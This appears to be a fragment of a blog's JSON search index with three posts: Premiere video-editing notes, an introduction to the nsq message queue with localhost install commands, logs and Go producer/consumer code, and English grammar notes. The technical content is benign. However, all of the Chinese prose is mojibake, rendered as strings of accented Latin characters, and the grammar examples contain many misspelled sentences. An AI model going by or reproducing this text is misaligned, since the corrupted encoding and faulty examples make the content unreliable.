ç‚¹ä¸­éŸ³ä¹æ®µ, å·¦ä¸Šè§’è°ƒèŠ‚çº§åˆ«(æ§åˆ¶éŸ³é‡, è´Ÿæ— ç©·åˆ°æ­£æ— ç©·)\n+ ç‚¹å‡»å‰é¢çš„å°é—¹é’Ÿ, ç„¶åå†Kå¸§, å¯ä»¥åˆ¶ä½œéŸ³é‡çš„å˜åŒ–\n\n##### 1.7 å­—å¹•\n\n+ çª—å£ -> å­—å¹• -> æ–°å»ºå­—å¹•\n\n##### 1.8 å¯¼å‡º\n\n+ æ–‡ä»¶ -> å¯¼å‡º -> H.264(mp4æ ¼å¼)\n+ é€šè¿‡è°ƒèŠ‚æ¯”ç‰¹ç‡/æœ€å¤§æ¯”ç‰¹ç‡ å¯ä»¥é™ä½æ–‡ä»¶çš„å¤§å°\n\n### 2. å¿«æ·é”®\n\n+ v é€‰æ‹©\n+ c å‰ªåˆ€\n+ m æ ‡è®°\n+ ~ å…¨å±\n+ space æ’­æ”¾/æš‚åœ\n+ å·¦å³ç®­å¤´  æ‰‹åŠ¨èµ°å¸§\n+ alt+é¼ æ ‡æ»šè½®  æ”¾å¤§ç¼©å°åºåˆ—\n+ del åˆ é™¤\n\n### 3. æ’ä»¶\n\n+ ç£¨çš®æ’ä»¶ Digital Anarchy Beauty Box\n\n  + show mask\n\n  + å¸å–ä½é¢œè‰²å’Œé«˜é¢œè‰²\n  + è°ƒèŠ‚ç¬¬äºŒä¸ªå‚æ•°(skin detail amount?), åŠ å¤§ç£¨çš®\n\n### 4. é‡åˆ°çš„é—®é¢˜\n\n+ Q: éŸ³æ•ˆå¸§æ— æ³•æ§åˆ¶\n\n  A: æŠŠæ•ˆæœ->çº§åˆ«ä¸Šé¢çš„é‚£ä¸ªå±æ€§(Bypass/æ—è·¯)ç»™å…³é—­\n\n+ Q: æ— æ³•åˆ é™¤è§†é¢‘è½¬åœº\n\n  A: æŠŠè§†é¢‘æ®µå®½åº¦é™ä½æˆ–å¢å¤§, ç‚¹å‡»è½¬åœºæ–‡å­—,åˆ é™¤\n\n### 5. æŠ€å·§\n\n+ åºåˆ—å½’ç±»åˆå¹¶\n\n  1. æ¯ä¸ªéŸ³é¢‘å¯ä»¥æ–°å»ºä¸€ä¸ªåŒååºåˆ—, ç„¶åå‰ªè¾‘åå½¢æˆæ–°çš„åºåˆ—\n\n  2. æœ€åæ–°å»ºä¸€ä¸ªåºåˆ—, æŠŠä¹‹å‰çš„åºåˆ—éƒ½æ‹–åˆ°è¿‡æ¥\n\n  3. å¦‚æœè§†é¢‘æ¯”è¾ƒå¤§, å¯ä»¥æŠŠæ­¥éª¤1çš„åºåˆ—å¯¼å‡ºä¸ºè§†é¢‘, å†è¿›è¡Œç¬¬äºŒä¸ªæ­¥éª¤\n\n+ å‰ªè¾‘æ”¶å°¾\n  1. éŸ³æ•ˆKå¸§å˜è´Ÿæ— ç©·\n  2. å¯ä»¥å¯¼å‡ºå¸§,å½¢æˆä¸€ä¸ªpng, åœç•™å‡ ç§’\n\n### 6. å‚è€ƒæ•™ç¨‹\n\n+ https://www.bilibili.com/video/av8703816/","tags":["photo"],"categories":["æ‘„å½±"]},{"title":"nsqçš„ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F17c769c4.html","content":"\n# 1. nsq ä»‹ç»\n\n[nsq](https://github.com/bitly/nsq)æ˜¯ä¸€ä¸ªåŸºäºGoè¯­è¨€çš„åˆ†å¸ƒå¼å®æ—¶æ¶ˆæ¯å¹³å°ï¼Œnsqå¯ç”¨äºå¤§è§„æ¨¡ç³»ç»Ÿä¸­çš„å®æ—¶æ¶ˆæ¯æœåŠ¡ï¼Œå¹¶ä¸”æ¯å¤©èƒ½å¤Ÿå¤„ç†æ•°äº¿çº§åˆ«çš„æ¶ˆæ¯ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯ä¸ºåœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹è¿è¡Œçš„å»ä¸­å¿ƒåŒ–æœåŠ¡æä¾›ä¸€ä¸ªå¼ºå¤§çš„åŸºç¡€æ¶æ„ã€‚\n\n<!-- more -->\n\n### 1.1 nsq çš„ç»„æˆ\n\nnsqæ˜¯ç”±å››ä¸ªé‡è¦ç»„ä»¶æ„æˆï¼š\n\n- [nsqd](http://bitly.github.io/nsq/components/nsqd.html)ï¼šä¸€ä¸ªè´Ÿè´£æ¥æ”¶ã€æ’é˜Ÿã€è½¬å‘æ¶ˆæ¯åˆ°å®¢æˆ·ç«¯çš„å®ˆæŠ¤è¿›ç¨‹\n- [nsqlookupd](http://bitly.github.io/nsq/components/nsqlookupd.html)ï¼šç®¡ç†æ‹“æ‰‘ä¿¡æ¯å¹¶æä¾›æœ€ç»ˆä¸€è‡´æ€§çš„å‘ç°æœåŠ¡çš„å®ˆæŠ¤è¿›ç¨‹\n- [nsqadmin](http://bitly.github.io/nsq/components/nsqadmin.html)ï¼šä¸€å¥—Webç”¨æˆ·ç•Œé¢ï¼Œå¯å®æ—¶æŸ¥çœ‹é›†ç¾¤çš„ç»Ÿè®¡æ•°æ®å’Œæ‰§è¡Œå„ç§å„æ ·çš„ç®¡ç†ä»»åŠ¡\n- [utilities](http://nsq.io/components/utilities.html)ï¼šå¸¸è§åŸºç¡€åŠŸèƒ½ã€æ•°æ®æµå¤„ç†å·¥å…·ï¼Œå¦‚nsq_statã€nsq_tailã€nsq_to_fileã€nsq_to_httpã€nsq_to_nsqã€to_nsq\n\n### 1.2 nsqçš„ä¸»è¦ç‰¹ç‚¹\n\n- å…·æœ‰åˆ†å¸ƒå¼ä¸”æ— å•ç‚¹æ•…éšœçš„æ‹“æ‰‘ç»“æ„ æ”¯æŒæ°´å¹³æ‰©å±•ï¼Œåœ¨æ— ä¸­æ–­æƒ…å†µä¸‹èƒ½å¤Ÿæ— ç¼åœ°æ·»åŠ é›†ç¾¤èŠ‚ç‚¹\n- ä½å»¶è¿Ÿçš„æ¶ˆæ¯æ¨é€ï¼Œå‚è§å®˜æ–¹æä¾›çš„[æ€§èƒ½è¯´æ˜æ–‡æ¡£](http://nsq.io/overview/performance.html)\n- å…·æœ‰ç»„åˆå¼çš„è´Ÿè½½å‡è¡¡å’Œå¤šæ’­å½¢å¼çš„æ¶ˆæ¯è·¯ç”±\n- æ—¢æ“…é•¿å¤„ç†é¢å‘æµï¼ˆé«˜ååé‡ï¼‰çš„å·¥ä½œè´Ÿè½½ï¼Œä¹Ÿæ“…é•¿å¤„ç†é¢å‘Jobçš„ï¼ˆä½ååé‡ï¼‰å·¥ä½œè´Ÿè½½\n- æ¶ˆæ¯æ•°æ®æ—¢å¯ä»¥å­˜å‚¨äºå†…å­˜ä¸­ï¼Œä¹Ÿå¯ä»¥å­˜å‚¨åœ¨ç£ç›˜ä¸­\n- å®ç°äº†ç”Ÿäº§è€…ã€æ¶ˆè´¹è€…è‡ªåŠ¨å‘ç°å’Œæ¶ˆè´¹è€…è‡ªåŠ¨è¿æ¥ç”Ÿäº§è€…ï¼Œå‚è§nsqlookupd\n- æ”¯æŒå®‰å…¨ä¼ è¾“å±‚åè®®ï¼ˆTLSï¼‰ï¼Œä»è€Œç¡®ä¿äº†æ¶ˆæ¯ä¼ é€’çš„å®‰å…¨æ€§\n- å…·æœ‰ä¸æ•°æ®æ ¼å¼æ— å…³çš„æ¶ˆæ¯ç»“æ„ï¼Œæ”¯æŒJSONã€Protocol Buffersã€MsgPacekç­‰æ¶ˆæ¯æ ¼å¼\n- éå¸¸æ˜“äºéƒ¨ç½²ï¼ˆå‡ ä¹æ²¡æœ‰ä¾èµ–ï¼‰å’Œé…ç½®ï¼ˆæ‰€æœ‰å‚æ•°éƒ½å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œè¿›è¡Œé…ç½®ï¼‰\n- ä½¿ç”¨äº†ç®€å•çš„TCPåè®®ä¸”å…·æœ‰å¤šç§è¯­è¨€çš„å®¢æˆ·ç«¯åŠŸèƒ½åº“\n- å…·æœ‰ç”¨äºä¿¡æ¯ç»Ÿè®¡ã€ç®¡ç†å‘˜æ“ä½œå’Œå®ç°ç”Ÿäº§è€…ç­‰çš„HTTPæ¥å£\n- ä¸ºå®æ—¶æ£€æµ‹é›†æˆäº†ç»Ÿè®¡æ•°æ®æ”¶é›†å™¨[StatsD](https://github.com/etsy/statsd/)\n- å…·æœ‰å¼ºå¤§çš„é›†ç¾¤ç®¡ç†ç•Œé¢ï¼Œå‚è§nsqadmin\n\n\n\n# 2. nsq ç»„ä»¶\n\n### 2.1 nsqd (çœŸæ­£å¹²æ´»çš„)\n\n1. nsqd æ˜¯ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè´Ÿè´£æ¥æ”¶ï¼Œæ’é˜Ÿï¼ŒæŠ•é€’æ¶ˆæ¯ç»™å®¢æˆ·ç«¯\n2. ç®€å•çš„è¯´ï¼ŒçœŸæ­£å¹²æ´»çš„å°±æ˜¯è¿™ä¸ªæœåŠ¡ï¼Œå®ƒä¸»è¦è´Ÿè´£messageçš„æ”¶å‘ï¼Œé˜Ÿåˆ—çš„ç»´æŠ¤ã€‚nsqdä¼šé»˜è®¤ç›‘å¬ä¸€ä¸ªtcpç«¯å£(4150)å’Œä¸€ä¸ªhttpç«¯å£(4151)ä»¥åŠä¸€ä¸ªå¯é€‰çš„httpsç«¯å£\n3. nsqd å…·æœ‰ä»¥ä¸‹åŠŸèƒ½æˆ–ç‰¹æ€§\n\n* å¯¹è®¢é˜…äº†åŒä¸€ä¸ªtopicï¼ŒåŒä¸€ä¸ªchannelçš„æ¶ˆè´¹è€…ä½¿ç”¨è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼ˆä¸æ˜¯è½®è¯¢ï¼‰\n* åªè¦channelå­˜åœ¨ï¼Œå³ä½¿æ²¡æœ‰è¯¥channelçš„æ¶ˆè´¹è€…ï¼Œä¹Ÿä¼šå°†ç”Ÿäº§è€…çš„messageç¼“å­˜åˆ°é˜Ÿåˆ—ä¸­ï¼ˆæ³¨æ„æ¶ˆæ¯çš„è¿‡æœŸå¤„ç†ï¼‰\n* ä¿è¯é˜Ÿåˆ—ä¸­çš„messageè‡³å°‘ä¼šè¢«æ¶ˆè´¹ä¸€æ¬¡ï¼Œå³ä½¿nsqdé€€å‡ºï¼Œä¹Ÿä¼šå°†é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯æš‚å­˜ç£ç›˜ä¸Š(ç»“æŸè¿›ç¨‹ç­‰æ„å¤–æƒ…å†µé™¤å¤–)\n* é™å®šå†…å­˜å ç”¨ï¼Œèƒ½å¤Ÿé…ç½®nsqdä¸­æ¯ä¸ªchannelé˜Ÿåˆ—åœ¨å†…å­˜ä¸­ç¼“å­˜çš„messageæ•°é‡ï¼Œä¸€æ—¦è¶…å‡ºï¼Œmessageå°†è¢«ç¼“å­˜åˆ°ç£ç›˜ä¸­\n* topicï¼Œchannelä¸€æ—¦å»ºç«‹ï¼Œå°†ä¼šä¸€ç›´å­˜åœ¨ï¼Œè¦åŠæ—¶åœ¨ç®¡ç†å°æˆ–è€…ç”¨ä»£ç æ¸…é™¤æ— æ•ˆçš„topicå’Œchannelï¼Œé¿å…èµ„æºçš„æµªè´¹\n\n\n\n### 2.2 nsqlookupd(ä¸­å¿ƒç®¡ç†æœåŠ¡)\n\n0. nsqlookupdæ˜¯å®ˆæŠ¤è¿›ç¨‹è´Ÿè´£ç®¡ç†æ‹“æ‰‘ä¿¡æ¯ã€‚å®¢æˆ·ç«¯é€šè¿‡æŸ¥è¯¢ nsqlookupd æ¥å‘ç°æŒ‡å®šè¯é¢˜ï¼ˆtopicï¼‰çš„ç”Ÿäº§è€…ï¼Œå¹¶ä¸” nsqd èŠ‚ç‚¹å¹¿æ’­è¯é¢˜ï¼ˆtopicï¼‰å’Œé€šé“ï¼ˆchannelï¼‰ä¿¡æ¯\n\n1. ç®€å•çš„è¯´nsqlookupdå°±æ˜¯ä¸­å¿ƒç®¡ç†æœåŠ¡ï¼Œå®ƒä½¿ç”¨tcp(é»˜è®¤ç«¯å£4160)ç®¡ç†nsqdæœåŠ¡ï¼Œä½¿ç”¨http(é»˜è®¤ç«¯å£4161)ç®¡ç†nsqadminæœåŠ¡ã€‚åŒæ—¶ä¸ºå®¢æˆ·ç«¯æä¾›æŸ¥è¯¢åŠŸèƒ½\n\n2. nsqlookupdå…·æœ‰ä»¥ä¸‹åŠŸèƒ½æˆ–ç‰¹æ€§\n\n* å”¯ä¸€æ€§ï¼Œåœ¨ä¸€ä¸ªNsqæœåŠ¡ä¸­åªæœ‰ä¸€ä¸ªnsqlookupdæœåŠ¡ã€‚å½“ç„¶ä¹Ÿå¯ä»¥åœ¨é›†ç¾¤ä¸­éƒ¨ç½²å¤šä¸ªnsqlookupdï¼Œä½†å®ƒä»¬ä¹‹é—´æ˜¯æ²¡æœ‰å…³è”çš„\n* å»ä¸­å¿ƒåŒ–ï¼Œå³ä½¿nsqlookupdå´©æºƒï¼Œä¹Ÿä¼šä¸å½±å“æ­£åœ¨è¿è¡Œçš„nsqdæœåŠ¡\n* å……å½“nsqdå’Œnaqadminä¿¡æ¯äº¤äº’çš„ä¸­é—´ä»¶\n* æä¾›ä¸€ä¸ªhttpæŸ¥è¯¢æœåŠ¡ï¼Œç»™å®¢æˆ·ç«¯å®šæ—¶æ›´æ–°nsqdçš„åœ°å€ç›®å½• \n\n\n\n### 2.3 nsqadmin(å±•ç¤ºæ•°æ®)\n\n0. æ˜¯ä¸€å¥— WEB UIï¼Œç”¨æ¥æ±‡é›†é›†ç¾¤çš„å®æ—¶ç»Ÿè®¡ï¼Œå¹¶æ‰§è¡Œä¸åŒçš„ç®¡ç†ä»»åŠ¡\n1. nsqadminå…·æœ‰ä»¥ä¸‹åŠŸèƒ½æˆ–ç‰¹æ€§\n    * æä¾›ä¸€ä¸ªå¯¹topicå’Œchannelç»Ÿä¸€ç®¡ç†çš„æ“ä½œç•Œé¢ä»¥åŠå„ç§å®æ—¶ç›‘æ§æ•°æ®çš„å±•ç¤ºï¼Œç•Œé¢è®¾è®¡çš„å¾ˆç®€æ´ï¼Œæ“ä½œä¹Ÿå¾ˆç®€å•\n    * å±•ç¤ºæ‰€æœ‰messageçš„æ•°é‡ï¼Œæ©....è£…Xåˆ©å™¨\n    * èƒ½å¤Ÿåœ¨åå°åˆ›å»ºtopicå’Œchannelï¼Œè¿™ä¸ªåº”è¯¥ä¸å¸¸ç”¨åˆ°\n    * nsqadminçš„æ‰€æœ‰åŠŸèƒ½éƒ½å¿…é¡»ä¾èµ–äºnsqlookupdï¼Œnsqadminåªæ˜¯å‘nsqlookupdä¼ é€’ç”¨æˆ·æ“ä½œå¹¶å±•ç¤ºæ¥è‡ªnsqlookupdçš„æ•°æ®\n\n\n\n# 3. nsq æ“ä½œ\n\n### 3.1 å®‰è£…å’Œå¯åŠ¨\n\nå®‰è£… nsq\n\n```Â bash\nbrew install nsq \n```\n\nå¯åŠ¨ nsqlookupd\n\n```bash\nnsqlookupd\n\n[nsqlookupd] 2020/07/14 13:10:26.005144 INFO: nsqlookupd v1.2.0 (built w/go1.13.5)\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: HTTP: listening on [::]:4161 # ç®¡ç† nsqd\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: TCP: listening on [::]:4160 # ç®¡ç† nsqadmin\n```\n\nå¯åŠ¨ nsqd\n\n```bash\nnsqd --lookupd-tcp-address=127.0.0.1:4160 -broadcast-address=127.0.0.1\n\n[nsqd] 2020/07/14 13:11:55.889343 INFO: nsqd v1.2.0 (built w/go1.13.5)\n[nsqd] 2020/07/14 13:11:55.889519 INFO: ID: 24\n[nsqd] 2020/07/14 13:11:55.889954 INFO: NSQ: persisting topic/channel metadata to nsqd.dat\n[nsqd] 2020/07/14 13:11:55.909569 INFO: TCP: listening on [::]:4150 # tcpç›‘å¬4150\n[nsqd] 2020/07/14 13:11:55.909673 INFO: HTTP: listening on [::]:4151 # httpç›‘å¬4151\n[nsqd] 2020/07/14 13:11:55.909858 INFO: LOOKUP(127.0.0.1:4160): adding peer\n[nsqd] 2020/07/14 13:11:55.909872 INFO: LOOKUP connecting to 127.0.0.1:4160\n[nsqd] 2020/07/14 13:11:55.914186 INFO: LOOKUPD(127.0.0.1:4160): peer info {TCPPort:4160 HTTPPort:4161 Version:1.2.0 BroadcastAddress:liuweideMacBook-Air.local}\n```\n\nå¯åŠ¨ nsqadmin\n\n```bash\nnsqadmin --lookupd-http-address=127.0.0.1:4161\n\n[nsqadmin] 2020/07/14 13:13:39.580161 INFO: nsqadmin v1.2.0 (built w/go1.13.5)\n[nsqadmin] 2020/07/14 13:13:39.581124 INFO: HTTP: listening on [::]:4171 # ç›‘å¬4171\n```\n\n### 3.2 æ“ä½œ\n\n+ æµè§ˆå™¨è®¿é—® http://127.0.0.1:4171/ è§‚å¯Ÿæ•°æ®\n\n+ å‘å¸ƒä¸€ä¸ªæ¶ˆæ¯ \n\n  ```bash\n  curl -d 'levonfly1' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n+ åˆ›å»ºä¸€ä¸ªæ¶ˆè´¹è€…\n\n  ```bash\n  nsq_to_file --topic=test --output-dir=/tmp --lookupd-http-address=127.0.0.1:4161\n  ```\n  å¯ä»¥åœ¨/tmp/æ–‡ä»¶å¤¹å†…çœ‹åˆ°è¾“å…¥çš„æ¶ˆæ¯log\n\n  \n\n+ å†å‘å¸ƒå‡ ä¸ªæ¶ˆæ¯\n\n  ```bash\n  curl -d 'levonfly2' 'http://127.0.0.1:4151/pub?topic=test'\n  curl -d 'levonfly3' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n\n\n# 4. golang ä½¿ç”¨ nsq\n\n### 4.1 ç”Ÿäº§è€…\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"time\"\n\n\tnsq \"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\t// è¿æ¥ nsqd çš„ tcp è¿æ¥\n\tproducer, err := nsq.NewProducer(\"127.0.0.1:4150\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// å‘å¸ƒæ¶ˆæ¯\n\tvar count int\n\tfor {\n\t\tcount++\n\t\tbody := fmt.Sprintf(\"test %d\", count)\n\t\tif err := producer.Publish(\"test\", []byte(body)); err != nil {\n\t\t\tlog.Fatal(\"publish error: \" + err.Error())\n\t\t}\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}\n```\n\n### 4.2 æ¶ˆè´¹è€…\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\n\t\"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\tconsumer, err := nsq.NewConsumer(\"test\", \"levonfly\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// å¤„ç†ä¿¡æ¯\n\tconsumer.AddHandler(nsq.HandlerFunc(func(message *nsq.Message) error {\n\t\tlog.Println(string(message.Body))\n\t\treturn nil\n\t}))\n\n\t// è¿æ¥ nsqd çš„ tcp è¿æ¥\n\tif err := consumer.ConnectToNSQD(\"127.0.0.1:4150\"); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t<-consumer.StopChan\n}\n```","tags":["nsq"],"categories":["ä¸­é—´ä»¶"]},{"title":"è‹±è¯­è¯­æ³•ç»“æ„","url":"%2Fp%2Fd2e27e6.html","content":"\n# ä¸€. å¥å­ç»“æ„\n\nä¸»è¯­: Subject -> åŠ¨ä½œçš„å‘å‡ºè€…\n\nè°“è¯­: Verb -> åŠ¨ä½œ\n\nå®¾è¯­: Object -> åŠ¨ä½œçš„æ‰¿å—è€…\n\n\n\n### 1.1 ç®€å•å¥:  ä¸»è¯­ + è°“è¯­ + å®¾è¯­\n\n### 1.2 å¹¶åˆ—å¥:  ä¸»è°“å®¾ + å¹¶åˆ—è¯ + [ä¸»]è°“å®¾\n\n+ å¹¶åˆ—è¯: and, or, but, not onlyâ€¦but also\n\n+ ä¸¤ä¸ªå¥å­æ˜¯åŒç­‰åœ°ä½\n\n### 1.3 å¤åˆå¥:  ä¸»è°“å®¾(ä¸»å¥) + ä»å¥å¼•å¯¼è¯ + ä¸»è°“å®¾(ä»å¥)\n\n+ ä»å¥å¼•å¯¼è¯: which, when, where\n\n+ ä¸»å¥æ˜¯ä¸»å¯¼åœ°ä½, ä»å¥æ˜¯ä»å±åœ°ä½\n+ ä»å¥ç±»å‹:\n  + åè¯æ€§ä»å¥(åè¯)\n  + å®šè¯­ä»å¥(å½¢å®¹è¯)\n  + çŠ¶è¯­ä»å¥(å‰¯è¯)\n\n#### 1.4 æ€»ç»“\n\n+ å¥å­å¿…é¡»æœ‰è°“è¯\n+ ä¸€ä¸ªç®€å•å¥å­ä¸èƒ½å‡ºç°å¤šä¸ªè°“è¯\n\n<!-- more -->\n\n# äºŒ. ç®€å•å¥çš„å˜ç§(å…­ä¸ªå¥å‹)\n\n### 2.1 ä¸» + è°“ + å®¾\n\n+ ä¸»: åè¯\n\n+ è°“: åŠç‰©åŠ¨è¯(åé¢å¯ä»¥æ¥ç‰©ä½“)\n+ å®¾: åè¯\n\n### 2.2 ä¸» + è°“\n\n+ è°“: ä¸åŠç‰©åŠ¨è¯(åé¢ä¸æ¥ç‰©ä½“)\n\n### 2.3 ä¸» + ç³» + è¡¨\n\n+ ç³»: ç³»åŠ¨è¯\n\n  + Be åŠ¨è¯ am, is, are, was, were\n\t+ æ„Ÿå®˜åŠ¨è¯(äº”å®˜)\n  \t\n\t\t+ look(çœ‹èµ·æ¥), sound(å¬èµ·æ¥),smell(é—»èµ·æ¥), taste(å°èµ·æ¥), feel(æ„Ÿè§‰)\n\t+ å˜åŒ–åŠ¨è¯\n\t  + become(å˜å¾—), turn(å˜æˆ), go(å˜å¾—), get(å˜å¾—), grow(æˆé•¿)\n\t+ é™æ­¢åŠ¨è¯\n  + stay, remain, keep\n+ è¡¨è¯­\n  + åè¯\n  + å½¢å®¹è¯\n  + ä¸å®šå¼(to do ä¸å®šå¼)\n  + ä»‹å®¾\n    + ä»‹è¯:  in on to\n    + ä»‹è¯ + åŠ¨åè¯\n\n\n\n### 2.4 ä¸» + è°“ + å®¾ + å®¾(ä½œç”¨äºå¤šä¸ªæ‰¿å—è€…)\n\nI give you money.\n\n### 2.5 ä¸» + è°“ + å®¾ + è¡¥(ç»“æ„å®Œæ•´,æ„æ€ä¸å®Œæ•´)\n\nThe music makes me sad.\n\n+ ä¸»: åè¯\n+ è°“: åŠç‰©åŠ¨è¯\n+ å®¾: åè¯\n+ è¡¥:\n  + å½¢å®¹è¯\n  + to do ä¸å®šå¼\n\n### 2.6 There be + åè¯ + [ä»‹å®¾] (è¡¨è¾¾å­˜åœ¨)\n\nThere is a dog.  //è¿™é‡Œæœ‰æ¡ç‹— (æœ‰æ˜¯å­˜åœ¨çš„æ„æ€, ä¸æ˜¯ have çš„æ„æ€)\n\nThere is a dog under the tree. //æ ‘ä¸‹æœ‰æ¡ç‹—\n\n\n\n# ä¸‰. ä»å¥: å¼•å¯¼è¯+ä¸»è°“å®¾(å°å¼Ÿ)\n\n\n\n### 3.1 åè¯æ€§ä»å¥(å¥å­çš„åè¯å¤æ‚)\n\n+ ä¸€æ¨¡ä¸€æ ·çš„å¥å­, åªä¸è¿‡ä½ç½®ä¸åŒ, æ‰€ä»¥åç§°ä¸åŒ\n\n+ å¼•å¯¼è¯ + ä»å¥ é™çº§å˜æˆäº†åè¯\n\n\n| ä¸»                   | è°“       | å®¾                   |\n| -------------------- | -------- | -------------------- |\n| åè¯                 | åŠç‰©åŠ¨è¯ | åè¯                 |\n| å¦‚æœåœ¨è¿™é‡Œ->ä¸»è¯­ä»å¥ |          | å¦‚æœåœ¨è¿™é‡Œ->å®¾è¯­ä»å¥ |\n\n##### 1 ä¸»è¯­ä»å¥\n\nThat he likes football surprised us.\n\n##### 2 å®¾è¯­ä»å¥\n\nHe said that he likes football.\n\n##### 3 è¡¨è¯­ä»å¥\n\nThe fact is that he likes football.\n\n##### 4 åŒä½è¯­ä»å¥(å¼•å¯¼è¯å¸¸è§ that)\n\nåŒä½è¯­æ˜¯è§£é‡Šåè¯çš„åè¯, 2ä¸ªåè¯åœ°ä½ç›¸ç­‰\n\nåŒä½è¯­:\n\n+ Levon, a love man, loves spring. (åŒä½è¯­ä¸»è¯­)\n\n+ Levon loves spring, one of  the four. (åŒä½è¯­å®¾è¯­)\n\nåŒä½è¯­ä»å¥:\n\n+ The fact, that he likes football suprised us.\n\n+ He states the fact that he likes football.\n\n\n\n\n### 3.2 å®šè¯­ä»å¥(ä¿®é¥°å¥å­çš„æŸä¸ªåè¯)\n\nå®šè¯­: ä¿®é¥°åè¯, åˆ†ä¸ºä¸¤ç§: \n\nå®š1: å½¢å®¹è¯(çŸ­ä¸€äº›)\n\nå®š2: çŸ­è¯­(ä»‹å®¾æˆ– to do ä¸å®šå¼)æˆ–å®šè¯­ä»å¥(é•¿ä¸€äº›)\n\n+ è‹±è¯­ä¸å–œæ¬¢å¤´é‡è„šè½»çš„å¥å­, å¦‚æœæ˜¯, è¯·å˜æˆå¤´è½»è„šé‡, é•¿çš„åœ¨åè¯åé¢æ”¾ç€\n+ (å®š1 ä¸»è¯­ å®š2)  + è°“è¯­ + (å®š1 + å®¾è¯­ + å®š2)\n\nå®šè¯­ä¾‹å­: \n\n+ A beautiful(å®š1) girl shard a facinating story.\n\n+ A gril from Mars(å®š2çŸ­è¯­) shard a story about her people(å®š2çŸ­è¯­).\n+ A task to tackle(å®š2çŸ­è¯­) is the potatial(å®š1) creiss.\n\nå®šè¯­ä»å¥ä¾‹å­:\n\n+ A girl who likes spring(å®š2ä»å¥) shard a story which moved us(å®š2ä»å¥).\n+ A beautiful(å®š1) girl from Mas(å®š2çŸ­è¯­) who likes spring(å®š2ä»å¥) shard a faciting(å®š1) story about her people(å®š2çŸ­è¯­) which moved us(å®š2ä»å¥).\n\n\n\n### 3.3 çŠ¶è¯­ä»å¥(ä¿®é¥°å¥å­çš„æŸä¸ªåŠ¨è¯æˆ–å½¢å®¹è¯)\n\n+ å°±æ˜¯å‰¯è¯, ä¿®é¥°åŠ¨è¯, å½¢å®¹è¯æˆ–æ•´ä¸ªå¥å­\n\n+ èµ·å‰¯è¯ä½œç”¨çš„å¥å­å°±æ˜¯çŠ¶è¯­ä»å¥\n\n##### 1  æ—¶é—´çŠ¶è¯­\n\nä½•æ—¶\n\n##### 2 åœ°ç‚¹çŠ¶è¯­\n\nåœ¨å“ª\n\n##### 3 åŸå› çŠ¶è¯­\n\nä¸ºå•¥\n\n##### 4 æ¡ä»¶çŠ¶è¯­\n\nåœ¨ä»€ä¹ˆæƒ…å†µä¸‹\n\n##### 5 ç›®çš„çŠ¶è¯­\n\nä¸ºäº†å•¥\n\n##### 6 ç»“æœçŠ¶è¯­\n\nå¯¼è‡´äº†å•¥\n\n##### 7 è®©æ­¥çŠ¶è¯­\n\nè½¬æŠ˜\n\n##### 8 æ–¹å¼çŠ¶è¯­\n\næ€ä¹ˆå‘ç”Ÿçš„ \n\n\n\nçŠ¶è¯­ä¾‹å­\n+ Levon smiles happily. (ä¿®é¥°åŠ¨è¯, å‰¯è¯åœ¨å)\n+ Levon quickly understand. (ä¿®è¾åŠ¨è¯, å‰¯è¯åœ¨å‰)\n+ She is strikingly beautiful.(ä¿®é¥°å½¢å®¹è¯)\n+ He is pretty tall.(ä¿®é¥°å½¢å®¹è¯)\n\næ—¶é—´å‰¯è¯\n+ He came yesterday.\n+ Yesterday He came.\n\næ—¶é—´çŠ¶è¯­ä»å¥\n+ He called me when I was sleeping.\n\nåœ°ç‚¹å‰¯è¯:\n+ He celebrated his birthday at school.\n+ At school he celebrated his brithday.\n\nåœ°ç‚¹çŠ¶è¯­ä»å¥\n+ We met where we used to go for a walk.\n\nåŸå› çŠ¶è¯­ä»å¥:\n+ He likes spring for it is beautiful.\n+ He likes spring since it is beautiful.(é™¤äº† since, å…¶ä»–å¼•å¯¼è¯éƒ½ä¸èƒ½åœ¨å‰é¢)\n\næ¡ä»¶çŠ¶è¯­ä»å¥:\n+ If you win, there will be a reward.\n+ As long as you win, there will be a reward.\n\nç›®çš„çŠ¶è¯­\n+ I study for my well-being.\n+ I don't spend extra to save money.\n+ I don't spend extra so that I can save money.(ä»å¥)\n\næ–¹å¼çŠ¶è¯­\n+ I learned English through an online course.\n+ I contact my friends via wechat.\n\nç»“æœçŠ¶è¯­ä»å¥\n+ He tried so hard that he finally successed.\n\nè®©æ­¥çŠ¶è¯­ä»å¥(åé¢ä¸è¦è½¬æ¥è¯)\n+ Although you have a point there, i don't agree with your proposal.\n\n\n\n\n\n# å››. ä¸‰ä¸ªç‰¹æ®Šå¥å¼\n\n### 4.1 å¼ºè°ƒå¥\n\n+ He hit me.\n\n  It was him that hit me.\n\n+ I learn about this project through this site.\n\n  It was through this site that I learned about this project.\n\nå¼ºè°ƒçš„å†…å®¹åœ¨ it is çš„åé¢\n\nIt is åè¯ that åŠ¨è¯(åè¯)  \n\nIt is ä»‹å®¾ that ä¸»è°“(å®¾)\n\n\n\n### 4.2 å€’è£…å¥\n\næ­£å¸¸å¥: ä¸»è°“(å®¾)\n\nå€’è£…å¥: è°“ä¸»(å®¾) \n\n+ We can win only when we try harder.\n\n  Only when we try harder can we win.\n\n+ We can win only through hard work.\n\n  Only through hard work can we win.\n\n\n\n### 4.3 è™šæ‹Ÿè¯­æ°”\n\nå‡è®¾ä¸€ä»¶æœ‰å¯èƒ½å‘ç”Ÿçš„äº‹æƒ… -> 